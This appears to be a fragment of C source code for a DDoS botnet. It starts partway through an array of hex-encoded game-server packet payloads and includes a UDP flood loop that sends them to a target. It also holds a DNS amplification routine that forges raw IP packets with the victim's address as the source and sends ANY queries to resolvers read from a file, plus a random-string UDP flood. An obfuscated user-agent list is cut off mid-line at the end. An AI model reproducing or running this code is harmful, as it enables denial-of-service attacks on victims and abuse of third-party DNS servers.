x66\x2b\xf3\x95\x19\xcb\x9c\x65\xd6\x32\x6f\x99\xb9\xcc\x5d\x66\x2f\xf3\x97\x19\xcc\x34\xcc\x2c\x66\x1e\x33\x93\x99\xcb\xcc\x66\xe6\x33\x33\x9a\x39\xcd\xac\x66\x5e\x33\xb3\x99\xdb\xcc\x6e\xe6\x37\x33\x9c\x69\x9c\x59\xce\x3c\x67\xa6\x33\xd7\x99\xed\xcc\x77\x66\x3c\x73\x9e\x59\xcf\xbc\x67\xe6\x33\xf7\x99\xfd\xcc\x7f\x66\x40\xd3\x40\xb3\xa0\x79\xd0\x4c\x68\x06", "\xa0\xdc\x94\x6f\x5b\xe9\x42\x33\x8c\x69\x8c\x59\xc6\x3c\x63\xa6\x31\xd7\x98\x6d\xcc\x37\x66\x1c\x73\x8e\x59\xc7\xbc\x63\xe6\x31\xf7\x98\x7d\xcc\x3f\x66\x20\xd3\x20\xb3\x90\x79\xc8\x4c\x64\x2e\x32\x1b\x99\x8f\xcc\x48\xe6\x24\xb3\x92\x79\xc9\xcc\x64\x6e\x32\x3b\x99\x9f\xcc\x50\xa6\x51\x66\x29\xf3\x94\x99\xca\x5c\x65\xb6\x32\x5f\x99\xb1\xcc\x59\x66\x2d\xf3\x96\x99\xcb\xdc\x65\xf6\x32\x7f\x99\xc1\x4c\xc3\xcc\x62\xe6\x31\x33\x99\xb9\xcc\x6c\x66\x3e\x33\xa3\x99\xd3\xcc\x6a\xe6\x35\x33\x9b\xb9\xcd\xec\x66\x7e\x33\xc3\x99\xc6\x99\xe5\xcc\x73\x66\x3a\x73\x9d\xd9\xce\x7c\x67\xc6\x33\xe7\x99\xf5\xcc\x7b\x66\x3e\x73\x9f\xd9\xcf\xfc\x67\x06\x34\x0d\x34\x0b\x9a\x07\xcd\x84\xe6\x42\xb3\xa1\xf9\xd0\x8c\x68\x4e\x34\x2b\x9a\x17\xcd\x8c\xe6\x46\xb3\xa3\xf9\xd1\x0c\x69\x1a\x69\x96\x34\x4f\x9a\x2f\xcd\x9a\x66\x54\x73\xaa\x59\xd5\x84\x03\x80\x86\x00\xe1\x93\x02\xe0\x56\x00\x1f\x05\x9e\x1a\xad\xf8\x98\xe1\x49\xab\x0a\xf3\xf0\xef\x60\x65\x96\x11\x00\x60\xdc\x65\x18\x09\x00\x80\x01\x01", "\xa0\xdc\x94\x6f\x59\x29\x07\x00\x30\x04\x35\xbc\x27\x06\x68\xf7\x04\x9d\x00\x00\x00\xbc\x1c\x85\xb5\x95\xbd\x34\xbd\x91\xcd\xbd\x50\xa1\x95\x0d\x95\xb9\xd1\x95\xc9\xbd\x50\xa1\x95\x0d\x95\xb9\xd1\x95\xc9\x7d\x31\x85\xd9\x85\x19\x85\xc9\x01\x00\x00\x00\x00\xf0\xc6\x00\xed\xc0\x20\x14\x00\x00\x80\x97\xa3\xb0\xb6\xb2\x97\xa6\x37\xb2\xb9\x17\x2a\xb4\xb2\xa1\x32\x37\xba\x32\xb9\x17\x2a\xb4\xb2\xa1\x32\x37\xba\x32\xb9\x2f\xa6\x30\xbb\x30\xa7\xb2\x30\x39\x00\x00\x00\x00\x00\x5e\x19\xa0\x9d\x18\xa4\x02\x00\x00\xf0\x72\x14\xd6\x56\xf6\xd2\xf4\x46\x36\xf7\x42\x85\x56\x36\x54\xe6\x46\x57\x26\xf7\x42\x85\x56\x36\x54\xe6\x46\x57\x26\xf7\x34\x56\x16\xe6\xe6\xf4\xe5\x54\x16\x26\x07\x00\x00\x00\x00\xc0\x33\x03\xb4\x1b\x83\x56\x00\x00\x00\x5e\x8e\xc2\xda\xca\x5e\x9a\xde\xc8\xe6\x5e\xa8\xd0\xca\x86\xca\xdc\xe8\xca\xe4\x5e\xa8\xd0\xca\x86\xca\xdc\xe8\xca\xe4\x9e\xc6\xca\xc2\xdc\x9c\xbe\x9c\xca\xc2\xe4\x84\x00\x00\x00\x00\x00\x78\x62\x80\x76\x4f\xd0\x09\x00\x00\xc0\xcb\x51\x58\x5b\xd9\x4b\xd3\x1b\xd9\xdc\x0b\x15\x5a\xd9\x50\x99\x1b\x5d\x99\xdc\x0b\x15\x5a\xd9\x50\x99\x1b\x5d\x99\xdc\x57\x50\xcc\x97\x51\x98\x9c\x10\x00\x00\x00\x00\x40\x4f\x0c\xd0\xee\x09\x3a\x01\x00\x00\x78\x39\x0a\x6b\x2b\x7b\x69\x7a\x23\x9b\x7b\xa1\x42\x2b\x1b\x2a\x73\xa3\x2b\x93\x7b\xa1\x42\x2b\x1b\x2a\x73\xa3\x2b\x93\xfb\x0a\x8a\xf9\x72\x2a\x0b\x93\x03\x00\x00\x00\x00\xe8\x8d\x01\xda\x81\x41\x28\x00\x00\x00\x2f\x47\x61\x6d\x65\x2f\x4d\x6f\x64\x73\x2f\x54\x68\x65\x43\x65\x6e\x74\x65\x72\x2f\x54\x68\x65\x43\x65\x6e\x74\x65\x72\x5f\x41\x31\x5f\x4e\x65\x61\x72\x42\x00\x00\x00\x00\x00\xbd\x30\x40\x3b\x27\xc8\x04\x00\x00\xe0\xe5\x28\xac\xad\xec\xa5\xe9\x8d\x6c\xee\x85\x0a\xad\x6c\xa8\xcc\x8d\xae\x4c\xee\x85\x0a\xad\x6c\xa8\xcc\x8d\xae\x4c\xee\x4b\x28\xe6\xcb\x28\x4c\x0e\x00\x00\x00\x00\xa0\x27\x06\x68\xf7\x04\x9d\x00\x00\x00\xbc\x1c\x85\xb5\x95\xbd\x34\xbd\x91\xcd\xbd\x50\xa1\x95\x0d\x95\xb9\xd1\x95\xc9\xbd\x50\xa1\x95\x0d\x95\xb9\xd1\x95\xc9\x7d\x09\xc5\x7c\x19\x85\xc9\x09\x01\x00\x00\x00\x00\x0c", "\xfd\xe2\xf9\x36\xc8\x02\x07\x00\x38\x00\x6d\x80\x22\x55\x01\x38\x00\xe0\x01\xc8\x22\x4c\x20\x48\x79\x2d\x30\x00\x00\x00\xc0\x99\x75\x00\x20\x02\x00\x00\x00\x4a\x2e\xad\x2d\x8c\x2d\xc9\xcd\xae\xcc\x8d\xee\x4d\x2e\x2f\x06\xc0\xdd\x44\x6f\xe2\x37\x11\x9c\x30\x9c\x28\x4e\x1c\x27\x02", "\xfd\xe2\xf9\x36\xc8\x02\x07\x00\x38\x00\x6d\x80\x22\x55\x01\x38\x00\xe0\x01\xc8\x22\x4c\x20\x48\x79\x2d\x30\x00\x00\x00\xc0\x99\x75\x00\x20\x02\x00\x00\x00\x4a\x2e\xad\x2d\x8c\x2d\xc9\xcd\xae\xcc\x8d\xee\x4d\x2e\x2f\x06\xc0\xdd\x44\x6f\xe2\x37\x11\x9c\x30\x9c\x28\x4e\x1c\x27\x02", "\x23\x80\x27\x33\xee\x56\x1d\xed\x8e\x96\x47\xdb\xa3\xf5\xd1\xfe\x68\x1c\x00\xb0\x04\x64\x11\x26\x10\xa4\xbc\x16\x18\x00\x00\x00\xa0\xd6\x36\x00\x10\x01\x00\x00\x00\x25\x97\xd6\x16\xc6\x96\xe4\x66\x57\xe6\x46\xf7\x26\x97\x17\x03\x60\x20\x2d\x40\x12\x51\x79", "\x3c\x5c\xa0\x99\x03\xc2\x83\x81\x17\x61\x25\x62\x47\x7d\xde\x96\xc1\x55\x7d\x93\x8d\x91\x7f\x46\x07\x00\x00\x00\xb2\xf7\xc5\x60\x8c\xd0\xca\xa5\xe7\xf9\x40\xca\x05\x7f\x52\x3b\xb5\xa4\xfb\x49\x91\x0f\x05\x6f\xa6\x4a\xfa\x63\x03\x7d\xbe\xc0\x13\x62\x01\xb7\xf5\x4f\xa4\xff\xba\x13\x22\x7e\x37\x11\xf8\xa4\x42\x2d\x95\x1d\xb1\x02\x00\x00\xea\x43\xbf\x61\xb3\x32\xea\x2b\x94\x73\xfa\xfc\x96\x6b\x8e\x0d\x73\x20\x87\xcc\x8d\x62\x6f\x0f\xaf\x44\x29\x09\x7b\x53\x81\x6c\xd6\x53\x44\xb7\x5d\xef\xad\x37\x98\x2a\xcd\xdd\x7a\xc1\x08\xb7\x3c\x5c\xa0\x99\xe2\xaf\x23\x2e\x61\x97\x7f\x8e\x9a\xa0\x8c\x9c\xb0\xed\x0e\x93\x05\xf8\xdc\xe2", "\xfd\xe2\xf9\x36\x0e\xcc\x2c\xa8\x16\x74\x0b\x52\x01\x00\x18\x80\x00\x40", "\x13\x8D\x69\x19\x06\x40\x01\xE0\x00\x90\x00\x58\x00\x34\x00\x1E\x00\x11\x80\x09\x40\x05\xE0\x02\x90\x01\xD8\x00\x74\x00\x3E\x00\x21\x00\x23\x80\x12\xC0\x09\x20\x05\xB0\x02\x68\x01\xBC\x00\x62\x00\x33\x80\x1A\xC0\x0D\x20\x07\xB0\x03\xE8\x01\xFC\x00\x82\x00\x86\x00\x45\x00\x0E\x00\x08\x00\xF2\x6B\x45\xC2\x00\x78\x69\x80\x76\x66\x90\x0B\x00\x00\xC0\xCB\x51\x58\x5B\xD9\x4B\x53\x18\xDC\xDC\x0B\x15\x5A\x59\xD2\x1C\x5B\x98\x1B\xD9\x54\x9D\x58\x53\x18\xDC\xDC\x0B\x53\x98\x1B\xD9\xDC\x58\x18\x5C\xD9\x54\x9D\x18\x5B\x99\x5D\x19\x1B\x00\x00\x00\x00\x40\x0F\x0D\xD0\xAE\x0C\x6A\x01\x00\x00\x78\x39\x0A\x6B\x2B\x7B\x69\x0A\x83\x9B\x7B\xA1\x42\x2B\x4B\x9A\x63\x0B\x73\x23\x9B\xAA\x13\x6B\x0A\x83\x9B\x7B\x69\x0A\x9B\xA3\x2B\x93\x4B\x12\x62\x1A\x0A\x83\xA3\xAB\x93\x2B\x03\x00\x00\x00\x00\xE8\xA5\x01\xDA\x99\x41\x2E\x00\x00\x00\x2F\x47\x61\x6D\x65\x2F\x4D\x61\x70\x73\x2F\x54\x68\x65\x49\x73\x6C\x61\x6E\x64\x53\x75\x62\x4D\x61\x70\x73\x2F\x4D\x61\x73\x74\x65\x72\x49\x42\x4C\x43\x61\x70\x74\x75\x72\x65\x73\x00\x00\x00\x00\x00\xBD\x32\x40\x3B\x31\x48\x05\x00\x00\xE0\xE5\x28\xAC\xAD\xEC\xA5\x29\x0C\x6E\xEE\x85\x0A\xAD\x2C\x69\x8E\x2D\xCC\x8D\x6C\xAA\x4E\xAC\x29\x0C\x6E\xEE\xA5\x29\x6C\x8E\xAE\x4C\x2E\x49\x88\x69\xCA\xED\xED\x0E\x00\x00\x00\x00\xA0\x07\x06\x68\xD7\x04\x95\x00\x00\x00\xBC\x1C\x85\xB5\x95\xBD\x34\x85\xC1\xCD\xBD\x50\xA1\x95\x25\xCD\xB1\x85\xB9\x91\x4D\xD5\x89\x35\x85\xC1\xCD\xBD\x3C\x89\x95\xB1\xA5\xCD\xAD\xCD\x01\x00\x00\x00\x00\xF4\x04\x01\xED\xDE\xA0\x1B\x00\x00\x80\x97\xA3\xB0\xB6\xB2\x97\xA6\x30\xB8\xB9\x17\x2A\xB4\xB2\xA4\x39\xB6\x30\x37\xB2\xA9\x3A\xB1\xA6\x30\xB8\xB9\x17\xA8\x32\xB9\xB9\xB4\x39\xBA\x32\x37\xBA\xA3\xB0\xB6\x32\x38\xB6\xB0\xBC\xA9\x3A\x31\xB6\x32\xBB\x32\x36\x00\x00\x00\x00\x80\x5E\x22\xA0\x9D\x21\xE4\x03\x00\x00\xF0\x72\x14\xD6\x56\xF6\xD2\x14\x06\x37\xF7\x42\x85\x56\x96\x34\xC7\x16\xE6\x46\x36\x55\x27\xD6\x14\x06\x37\xF7\x02\x55\x26\x37\x97\x36\x47\x57\xE6\x46\x77\x14\xD6\x56\x06\xC7\x16\x96\x37\x55\x27\xC6\x56\x66\x57\xC6\xF6\x25\x94\xF6\xD6\x56\x36\x07\x00\x00\x00\x00\x30", "\x13\x8D\x69\x19\x08\x00\x01\x00\x14\x80\xA0\x00\x01\xA8\x61\x00\x00\x07\x00\x10\x00\x4D\xB6\x27\x06\x68\xF7\x04\x9D\x00\x00\x00\xBC\x1C\x85\xB5\x95\xBD\x34\x85\xC1\xCD\xBD\x50\xA1\x95\x25\xCD\xB1\x85\xB9\x91\x4D\xD5\x89\x35\x85\xC1\xCD\xBD\x10\xC5\x7C\x19\x85\xC9\x7D\x5D\x25\x41\x01\x00\x00\x00\x00\xF4\xC4\x00\xED\x9E\xA0\x13\x00\x00\x80\x97\xA3\xB0\xB6\xB2\x97\xA6\x30\xB8\xB9\x17\x2A\xB4\xB2\xA4\x39\xB6\x30\x37\xB2\xA9\x3A\xB1\xA6\x30\xB8\xB9\x17\x22\x99\x2F\xA3\x30\xB9\xAF\xAB\x24\x28\x00\x00\x00\x00\x80\x9E\x18\xA0\xDD\x13\x74\x02\x00\x00\xF0\x72\x14\xD6\x56\xF6\xD2\x14\x06\x37\xF7\x42\x85\x56\x96\x34\xC7\x16\xE6\x46\x36\x55\x27\xD6\x14\x06\x37\xF7\x42\x34\xF3\x65\x14\x26\xF7\x75\x95\x04\x05\x00\x00\x00\x00\xD0\x13\x03\xB4\x7B\x82\x4E\x00\x00\x00\x5E\x8E\xC2\xDA\xCA\x5E\x9A\xC2\xE0\xE6\x5E\xA8\xD0\xCA\x92\xE6\xD8\xC2\xDC\xC8\xA6\xEA\xC4\x9A\xC2\xE0\xE6\x5E\x8A\x62\xBE\x8C\xC2\xE4\xBE\xAE\x92\xA0\x00\x00\x00\x00\x00\x7A\x62\x80\x76\x4F\xD0\x09\x00\x00\xC0\xCB\x51\x58\x5B\xD9\x4B\x53\x18\xDC\xDC\x0B\x15\x5A\x59\xD2\x1C\x5B\x98\x1B\xD9\x54\x9D\x58\x53\x18\xDC\xDC\x4B\x91\xCC\x97\x51\x98\xDC\xD7\x55\x12\x14\x00\x00\x00\x00\x40\x6F\x0C\xD0\x0E\x0C\x42\x01\x00\x00\x78\x39\x0A\x6B\x2B\x7B\x69\x0A\x83\x9B\x7B\xA1\x42\x2B\x4B\x9A\x63\x0B\x73\x23\x9B\xAA\x13\x6B\x0A\x83\x9B\x7B\x29\x92\xF9\x72\x2A\x0B\x93\xFB\xBA\x4A\x82\x02\x00\x00\x00\x00\xE8\x89\x01\xDA\x3D\x41\x27\x00\x00\x00\x2F\x47\x61\x6D\x65\x2F\x4D\x61\x70\x73\x2F\x54\x68\x65\x49\x73\x6C\x61\x6E\x64\x53\x75\x62\x4D\x61\x70\x73\x2F\x45\x33\x5F\x46\x61\x72\x5F\x57\x49\x50\x00\x00\x00\x00\x00\xBD\x35\x40\x3B\x34\x08\x06\x00\x00\xE0\xE5\x28\xAC\xAD\xEC\xA5\x29\x0C\x6E\xEE\x85\x0A\xAD\x2C\x69\x8E\x2D\xCC\x8D\x6C\xAA\x4E\xAC\x29\x0C\x6E\xEE\xA5\xCA\x8D\xAC\x4C\xEE\x2A\x8C\xAE\x4C\xEE\x6B\xEA\xAD\x8E\x0E\xED\x0B\x46\x06\x00\x00\x00\x00\xA0\x22\x1E\x01\x8E\x00\x49\x80\x25\x40\x13\xE0\x09\x10\x05\x98\x02\x54\x01\xAE\x00\x59\x80\x2D\x40\x17\xE0\x0B\x10\x06\x08\x00\x00\x00\x30\x06\x28\x03\x9C\x01\xD2\x00\x6B\x80\x36\xC0\x1B\x20\x0E\x30\x07\xA8\x03\xDC\x01\xF2\x00\x7B\x80\x3E\xC0\x1F\x20", "\x13\x8D\x69\x19\x00\x45\x53\xE3\xA9\xC1\x01\x00\x18\x40\x16\x61\x02\x41\xCA\x6B\x81\x01\x00\x00\x00\xF6\x13\x00\x00\x11\x00\x00\x00\x50\x72\x69\x6D\x61\x6C\x49\x6E\x76\x65\x6E\x74\x6F\x72\x79\x31\x00\x46\x35\xC0\x0B\x40\x27\xD0\xF2\x11\x00\x88\x20\xC0\x74\x81\xF4\x1D\x08\x42\x69\x9A\xED\x9A\x72\x30\x00\x00\x80\x37\x76\xD4\x71\x02\xDD\x2A\xEF\x94\x30\x27\x8F\xE9\x00\xA7\xCF\x14\x08", "\x13\x8D\x69\x19\x99\xE9\x7D\x37\xBF\xCB\x01\x00\x40\x40\x16\x61\x02\x41\xCA\x6B\x81\x01\x00\x00\x00\x76\xE3\x01\x00\x11\x00\x00\x00\x50\x72\x69\x6D\x61\x6C\x49\x6E\x76\x65\x6E\x74\x6F\x72\x79\x31\x00\xEE\x77\xC1\x0B\x40\x2B\xD0\xF2\x11\x00\x88\x22\xC0\x14\x82\x5A\xF3\x0A\x43\x69\x11\x8C\xAE\xDB\xF8\x00\x00\x80\x37\x58\xB4\x9C\x02\xE0\x99\xEB\x64\xA0\x25\x8F\xB9\xFD\x27\xE9\x4B\x0F\x00\x00\x0C\x08", "\x13\x8D\x69\x19\x94\x41\xBE\x61\xDF\xC0\x01\x00\xC3\x40\x16\x61\x02\x41\xCA\x6B\x81\x01\x00\x00\x00\xA8\x11\x00\x00\x11\x00\x00\x00\x50\x72\x69\x6D\x61\x6C\x49\x6E\x76\x65\x6E\x74\x6F\x72\x79\x31\x00\xF6\x1B\xFE\x0D\xE0\x05\xA0\x1D\x68\xF9\x08\x00\xB0\x33\xF5\xEB\xFB\x44\xA1\x74\xD7\x7C\x40\x22\x68\x01\x00\x40\x68\xF9\x08\x00\x44\x10\x60\xBA\x40\x88\x15\x45\xA1\x14\x73\x8B\x50\x0A\x6F\x01\x00\xC0\x1B\x2D\x08\x2A\x41\x56\x8D\x77\xD7\xAA\x92\xC7\x98\xFB\x17\x36\x0A\x04", "\x13\x8D\x69\x19\x08\x00\x01\x00\x14\x80\xA0\x00\x01\xA8\x61\x00\x00\x07\x00\x10\x00\x4D\xB6\x27\x06\x68\xF7\x04\x9D\x00\x00\x00\xBC\x1C\x85\xB5\x95\xBD\x34\x85\xC1\xCD\xBD\x50\xA1\x95\x25\xCD\xB1\x85\xB9\x91\x4D\xD5\x89\x35\x85\xC1\xCD\xBD\x10\xC5\x7C\x19\x85\xC9\x7D\x5D\x25\x41\x01\x00\x00\x00\x00\xF4\xC4\x00\xED\x9E\xA0\x13\x00\x00\x80\x97\xA3\xB0\xB6\xB2\x97\xA6\x30\xB8\xB9\x17\x2A\xB4\xB2\xA4\x39\xB6\x30\x37\xB2\xA9\x3A\xB1\xA6\x30\xB8\xB9\x17\x22\x99\x2F\xA3\x30\xB9\xAF\xAB\x24\x28\x00\x00\x00\x00\x80\x9E\x18\xA0\xDD\x13\x74\x02\x00\x00\xF0\x72\x14\xD6\x56\xF6\xD2\x14\x06\x37\xF7\x42\x85\x56\x96\x34\xC7\x16\xE6\x46\x36\x55\x27\xD6\x14\x06\x37\xF7\x42\x34\xF3\x65\x14\x26\xF7\x75\x95\x04\x05\x00\x00\x00\x00\xD0\x13\x03\xB4\x7B\x82\x4E\x00\x00\x00\x5E\x8E\xC2\xDA\xCA\x5E\x9A\xC2\xE0\xE6\x5E\xA8\xD0\xCA\x92\xE6\xD8\xC2\xDC\xC8\xA6\xEA\xC4\x9A\xC2\xE0\xE6\x5E\x8A\x62\xBE\x8C\xC2\xE4\xBE\xAE\x92\xA0\x00\x00\x00\x00\x00\x7A\x62\x80\x76\x4F\xD0\x09\x00\x00\xC0\xCB\x51\x58\x5B\xD9\x4B\x53\x18\xDC\xDC\x0B\x15\x5A\x59\xD2\x1C\x5B\x98\x1B\xD9\x54\x9D\x58\x53\x18\xDC\xDC\x4B\x91\xCC\x97\x51\x98\xDC\xD7\x55\x12\x14\x00\x00\x00\x00\x40\x6F\x0C\xD0\x0E\x0C\x42\x01\x00\x00\x78\x39\x0A\x6B\x2B\x7B\x69\x0A\x83\x9B\x7B\xA1\x42\x2B\x4B\x9A\x63\x0B\x73\x23\x9B\xAA\x13\x6B\x0A\x83\x9B\x7B\x29\x92\xF9\x72\x2A\x0B\x93\xFB\xBA\x4A\x82\x02\x00\x00\x00\x00\xE8\x89\x01\xDA\x3D\x41\x27\x00\x00\x00\x2F\x47\x61\x6D\x65\x2F\x4D\x61\x70\x73\x2F\x54\x68\x65\x49\x73\x6C\x61\x6E\x64\x53\x75\x62\x4D\x61\x70\x73\x2F\x45\x33\x5F\x46\x61\x72\x5F\x57\x49\x50\x00\x00\x00\x00\x00\xBD\x35\x40\x3B\x34\x08\x06\x00\x00\xE0\xE5\x28\xAC\xAD\xEC\xA5\x29\x0C\x6E\xEE\x85\x0A\xAD\x2C\x69\x8E\x2D\xCC\x8D\x6C\xAA\x4E\xAC\x29\x0C\x6E\xEE\xA5\xCA\x8D\xAC\x4C\xEE\x2A\x8C\xAE\x4C\xEE\x6B\xEA\xAD\x8E\x0E\xED\x0B\x46\x06\x00\x00\x00\x00\xA0\x22\x1E\x01\x8E\x00\x49\x80\x25\x40\x13\xE0\x09\x10\x05\x98\x02\x54\x01\xAE\x00\x59\x80\x2D\x40\x17\xE0\x0B\x10\x06\x08\x00\x00\x00\x30\x06\x28\x03\x9C\x01\xD2\x00\x6B\x80\x36\xC0\x1B\x20\x0E\x30\x07\xA8\x03\xDC\x01\xF2\x00\x7B\x80\x3E\xC0\x1F\x20", "\x44\x65\xca\x31\xd8\x32\x10\x00\x68\x05\x5a\x3e\x02\x00\x51\x04\x98\x42\x30\xf7\x00\x45\x28\xfd\xdb\x27\x55\xb3\x7d\x00\x00\xf0\x06\x93\x26\x3a\x70\xc9\xb8\x9e\xf8\xc4\xe4\x11\x07\x7e\xe9\xe5\xb4\x04\x00\x80%c%c%c"};
while(1){
char *pkt_str = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if(strstr(pkt_str, "%c%c%c")) {
	char xd[256];
	memset(xd, 0, 256);
	sprintf(xd, pkt_str, rand() % 256, rand() % 256, rand() % 256);
    n = sendto(sockfd, xd, strlen(pkt_str), 0, (struct sockaddr *)&serveraddr, serverlen);
	continue;
}
if (a >= 50)
{
    n = sendto(sockfd, pkt_str, strlen(pkt_str), 0, (struct sockaddr *)&serveraddr, serverlen);
if (time(NULL) >= start + secs)
{
_exit(0);
}
a = 0;
}
a++;
}
}

struct thread_data {
    char *target;
    int dport;
    int time;
};
 
typedef struct iphdr iph;
typedef struct udphdr udph;
 
// Pseudoheader struct
typedef struct {
    u_int32_t saddr;
    u_int32_t daddr;
    u_int8_t filler;
    u_int8_t protocol;
    u_int16_t len;
}
ps_hdr;
 
// DNS header struct
typedef struct {
    unsigned short id; // ID
    unsigned short flags; // DNS Flags
    unsigned short qcount; // Question Count
    unsigned short ans; // Answer Count
    unsigned short auth; // Authority RR
    unsigned short add; // Additional RR
}
dns_hdr;
 
// Question types
typedef struct {
    unsigned short qtype;
    unsigned short qclass;
}
query;
 
// Taken from http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
void dns_format(unsigned char *dns, unsigned char *host) {
    int lock = 0, i;
    strcat((char *) host, ".");
    for (i = 0; i < strlen((char *) host); i++) {
        if (host[i] == '.') {
            * dns++ = i - lock;
            for (; lock < i; lock++) {
                * dns++ = host[lock];
            }
            lock++;
        }
    }
    * dns++ = 0x00;
}
 
// Creates the dns header and packet
void dns_hdr_create(dns_hdr * dns) {
    dns->id = (unsigned short) htons(getpid());
    dns->flags = htons(0x0100);
    dns->qcount = htons(1);
    dns->ans = 0;
    dns->auth = 0;
    dns->add = 0;
}


/* UDP header as specified by RFC 768, August 1980. */
struct udphdr
{
  uint16_t source;
  uint16_t dest;
  uint16_t len;
  uint16_t check;
};

/* 
	96 bit (12 bytes) pseudo header needed for udp header checksum calculation 
*/
struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t udp_length;
};

void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, unsigned char *dns_record) {
    // Building the DNS request data packet
 
    unsigned char dns_data[128];
 
    dns_hdr * dns = (dns_hdr * )&dns_data;
    dns_hdr_create(dns);
 
    unsigned char *dns_name, dns_rcrd[32];
    dns_name = (unsigned char *)&dns_data[sizeof(dns_hdr)];
    strcpy(dns_rcrd, dns_record);
    dns_format(dns_name, dns_rcrd);
 
    query * q;
    q = (query * )&dns_data[sizeof(dns_hdr) + (strlen(dns_name) + 1)];
    q->qtype = htons(0x00ff);
    q->qclass = htons(0x1);
 
    // Building the IP and UDP headers
    char datagram[4096], * data, * psgram;
    memset(datagram, 0, 4096);
 
    data = datagram + sizeof(iph) + sizeof(udph);
    memcpy(data,&dns_data, sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query) + 1);
 
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53);
    sin.sin_addr.s_addr = inet_addr(dns_srv);
 
    iph * ip = (iph * ) datagram;
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
    ip->id = htonl(rand_cmwc()&0xFFFFFFFF);
    ip->frag_off = 0;
    ip->ttl = 64;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = inet_addr(trgt_ip);
    ip->daddr = sin.sin_addr.s_addr;
    ip->check = csum((unsigned short * ) datagram, ip->tot_len);
 
    udph * udp = (udph * )(datagram + sizeof(iph));
    udp->source = htons(trgt_p);
    udp->dest = htons(53);
    udp->len = htons(8 + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
    udp->check = 0;
 
    // Pseudoheader creation and checksum calculation
    ps_hdr pshdr;
    pshdr.saddr = inet_addr(trgt_ip);
    pshdr.daddr = sin.sin_addr.s_addr;
    pshdr.filler = 0;
    pshdr.protocol = IPPROTO_UDP;
    pshdr.len = htons(sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
 
    int pssize = sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
    psgram = malloc(pssize);
 
    memcpy(psgram, (char *)&pshdr, sizeof(ps_hdr));
    memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
 
    udp->check = csum((unsigned short * ) psgram, pssize);
 
    // Send data
    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sd == -1) return;
    else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr * )&sin, sizeof(sin));
 
    free(psgram);
    close(sd);
 
    return;
}
void dnsflood(void * par1) {
    if (!listFork()) return;
    struct thread_data * td = (struct thread_data * ) par1;
    char *target = td->target;
    int dport = td->dport;
    int secs = td->time;
    char buffer[100];
    srand(time(NULL) ^ getpid());
    int i;
    int end = time(NULL) + secs;
    while (time(NULL) < end) {
        FILE * fp = fopen("DNS.txt", "r");
        while (fgets(buffer, 100, fp)) {
            buffer[strcspn(buffer, "\r\n")] = 0;
			dns_send(target, dport, buffer, "pixnet.net");
        }
        fclose(fp);
    }
	exit(0);
}
 

void sendPkt(unsigned char *host, int port, int secs) {
	int a = 0;
	int start = time(NULL);
    int sockfd, portno, n;
    int serverlen;
    struct sockaddr_in serveraddr;

    /* socket: create the socket */
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) 
        return;


    /* build the server's Internet address */
    bzero((char *) &serveraddr, sizeof(serveraddr));
    serveraddr.sin_family = AF_INET;
    if (getHost(host, & serveraddr.sin_addr)) return;
    serveraddr.sin_port = HTONS(port);

    /* send the message to the server */
    serverlen = sizeof(serveraddr);
char *randstrings[] = {"PozHlpiND4xPDPuGE6tq","tg57YSAcuvy2hdBlEWMv","VaDp3Vu5m5bKcfCU96RX","UBWcPjIZOdZ9IAOSZAy6","JezacHw4VfzRWzsglZlF","3zOWSvAY2dn9rKZZOfkJ","oqogARpMjAvdjr9Qsrqj","yQAkUvZFjxExI3WbDp2g","35arWHE38SmV9qbaEDzZ","kKbPlhAwlxxnyfM3LaL0","a7pInUoLgx1CPFlGB5JF","yFnlmG7bqbW682p7Bzey","S1mQMZYF6uLzzkiULnGF","jKdmCH3hamvbN7ZvzkNA","bOAFqQfhvMFEf9jEZ89M","VckeqgSPaAA5jHdoFpCC","CwT01MAGqrgYRStHcV0X","72qeggInemBIQ5uJc1jQ","zwcfbtGDTDBWImROXhdn","w70uUC1UJYZoPENznHXB","EoXLAf1xXR7j4XSs0JTm","lgKjMnqBZFEvPJKpRmMj","lSvZgNzxkUyChyxw1nSr","VQz4cDTxV8RRrgn00toF"};
while(1){
char *pkt_str = randstrings[rand() % (sizeof(randstrings) / sizeof(char *))];
if (a >= 50)
{

    n = sendto(sockfd, pkt_str, strlen(pkt_str), 0, (struct sockaddr *)&serveraddr, serverlen);
if (time(NULL) >= start + secs)
{
_exit(0);
}
a = 0;
}
a++;
}
}

char * useragents[] = {
	"\x62\xb9\x3e\x19\x3c\x3c\x90\x27\xcf\x97\x50\x34\x1b\x77\x19\xff\x61\xb9\x5a\x03\x34\xd9\xb0\x34\xeb\x50\x97\x50\x42\x34\x77\x19\xff\x2a\x6f\x42\x34\xc1\x2a\x6f\xd3\x34\xa4\xa0\xa0\x3c\x51\x77\x51\xd2\x4c\x19\x39\x27\xcf\xe2\x47\x97\xe2\x2a\x34\x1b\x4c\xc3\xb0\x62\x5c\xec\x34\x3c\x19\x78\x51\x34\xd7\x51\xce\x78\xb9\xd3\x34\xda\x65\xe7\xb9\xd4\x51\x27\xcf\xd0\x97\x50\x97\xe2\x50\x47\xeb\x97\x9a\x2a\x34\x46\x90\x75\x90\xe7\x19\x27\xcf\xe2\x47\x97\xe2\x2a", 